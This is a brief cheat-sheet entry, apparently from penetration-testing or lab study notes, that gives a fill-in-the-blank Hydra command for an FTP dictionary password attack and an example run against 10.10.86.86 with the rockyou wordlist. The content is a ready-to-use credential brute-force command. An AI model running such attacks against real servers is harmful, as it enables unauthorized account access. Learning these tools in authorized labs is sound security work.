# Hydra - FTP

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

### FTP Dictionary Attack:
```
hydra -l [USERNAME] -P [WORDLIST-PATH] ftp://[TARGET-IP]
```
Example:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.10.86.86
```
